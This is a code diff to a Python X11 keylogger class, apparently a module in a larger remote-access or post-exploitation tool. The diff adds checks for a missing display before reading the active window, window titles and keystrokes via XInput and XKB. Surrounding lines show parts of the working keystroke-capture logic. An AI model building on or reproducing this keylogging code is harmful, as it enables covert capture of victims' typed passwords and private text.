@@ -571,6 +571,9 @@ class KeyLogger(threading.Thread):
             raise NotAvailable()
 
     def get_active_window(self):
+        if not self.display:
+            raise NotAvailable()
+
         window = ct.c_ulong()
         dw = ct.c_int()
 
@@ -582,6 +585,9 @@ class KeyLogger(threading.Thread):
         return window
 
     def get_window_title(self, window):
+        if not self.display:
+            raise NotAvailable()
+
         if not window:
             return
 
@@ -608,7 +614,7 @@ class KeyLogger(threading.Thread):
             callback(self.to_keysyms(released, group, level))
 
     def xinput(self, callback):
-        if not self.xi:
+        if not self.xi or not self.display:
             raise NotAvailable()
 
         xi_opcode = ct.c_int()
@@ -668,6 +674,9 @@ class KeyLogger(threading.Thread):
         return res
 
     def fetch_keys_poll(self):
+        if not self.display:
+            raise NotAvailable()
+
         state = XkbState()
         self.x11.XkbGetState(self.display, 0x0100, ct.pointer(state))
 
@@ -696,6 +705,9 @@ class KeyLogger(threading.Thread):
         return released, group, level
 
     def to_keysyms(self, released, group, level):
+        if not self.display:
+            raise NotAvailable()
+
         keys = set()
 
         for k in set(released):
@@ -725,6 +737,7 @@ class KeyLogger(threading.Thread):
     def __del__(self):
         if self.display:
             self.x11.XCloseDisplay(self.display)
+            self.display = None
 
 if __name__=="__main__":
     #the main is only here for testing purpose and won't be run by modules
